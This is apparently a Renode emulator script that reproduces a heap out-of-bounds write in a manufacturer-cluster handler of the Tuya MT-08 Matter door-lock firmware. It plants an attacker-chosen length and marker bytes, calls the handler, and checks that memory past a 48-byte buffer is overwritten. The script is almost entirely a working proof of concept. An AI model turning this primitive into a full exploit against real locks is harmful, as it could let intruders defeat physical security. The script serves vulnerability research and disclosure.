:name: MT-08 Tuya Matter door-lock 0x125DFC32 mfg-cluster HEAP OOB write — OPTION A (real handler)
:description: Drives the REAL mfg-cluster 0x125DFC32 handler sub_8016194 of the Tuya MT-08 Matter firmware end-to-end on the emulated EFR32MG24, showing it loads an attacker-controlled length (a1[6]) and calls the unbounded sink sub_804A1BC to write PAST a caller-provided HEAP buffer's declared end (HEAP OOB write, NOT stack/saved-LR).
#
# sub_8016194 @0x8016194. Args: a1=r0 (record: [6]=len, [7..]=src data),
#   a2=r1 (intended size, only null-checked), a3=r2 (DEST heap buffer),
#   a4=r3 (out ptr). 0x80161c4 LDRB R2,[R5,#6] loads a1[6]=len; the copy at
#   0x80161e6 BL sub_804A1BC(dest=a3+4, src=a1+7, len=a1[6]). len is never
#   clamped to the dest buffer size -> HEAP OOB write.
# We STOP right after the copy BL returns (PC in the 0x80161ea..0x8016208
# window) and BEFORE the log/printf BL at 0x801620a, which is not step-safe.

$bin=@scripts/silabs-vuln/mt08_tuya.elf
$vtor=0x08008000
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause
sysbus.cpu VectorTableOffset 0x08008000

# --- record a1 @0x20010000: attacker length a1[6]=0xC8 (200) at 0x20010006 ---
sysbus WriteByte 0x20010006 0xC8
# source a1+7 @0x20010007 filled 0xCC; marker DE AD BE EF at 0x20010033
# (payload offset 44 -> lands at dest+48, one word past the notional 48B buffer)
sysbus WriteDoubleWord 0x20010007 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001000B 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001000F 0xCCCCCCCC
sysbus WriteDoubleWord 0x20010013 0xCCCCCCCC
sysbus WriteDoubleWord 0x20010017 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001001B 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001001F 0xCCCCCCCC
sysbus WriteDoubleWord 0x20010023 0xCCCCCCCC
sysbus WriteDoubleWord 0x20010027 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001002B 0xCCCCCCCC
sysbus WriteDoubleWord 0x2001002F 0xCCCCCCCC
sysbus WriteDoubleWord 0x20010033 0xDEADBEEF

# --- dest heap buffer a3 @0x20011000 (notional 48B, end 0x20011030) ---
#     sentinel one word past the end pre-seeded 0xA5A5A5A5
sysbus WriteDoubleWord 0x20011030 0xA5A5A5A5

# --- Call contract for sub_8016194(a1,a2,a3,a4) ---
sysbus.cpu SetRegister 0  0x20010000
sysbus.cpu SetRegister 1  0x00000010
sysbus.cpu SetRegister 2  0x20011000
sysbus.cpu SetRegister 3  0x20012000
sysbus.cpu SetRegister 13 0x2001F000
sysbus.cpu SetRegister 14 0x08016195
sysbus.cpu PC 0x8016194

echo ">>> OPTION A: HEAP OOB write via real handler sub_8016194"
echo ">>> BEFORE: dest+48 sentinel @0x20011030 (declared heap buffer end) ="
sysbus ReadDoubleWord 0x20011030

# Step to just after the copy BL returns (lands at PC=0x80161f4, in the
# 0x80161ea..0x8016208 window) and BEFORE the log BL at 0x801620a.
sysbus.cpu Step 845

echo ">>> AFTER: PC (expect 0x80161f4, copy returned, before log BL @0x801620a) ="
sysbus.cpu PC
echo ">>> AFTER: dest+48 sentinel @0x20011030 (expect 0xDEADBEEF = OOB write) ="
sysbus ReadDoubleWord 0x20011030
echo ">>> AFTER: dest+4 start @0x20011004 (expect 0xCCCCCCCC = in-bounds copy) ="
sysbus ReadDoubleWord 0x20011004
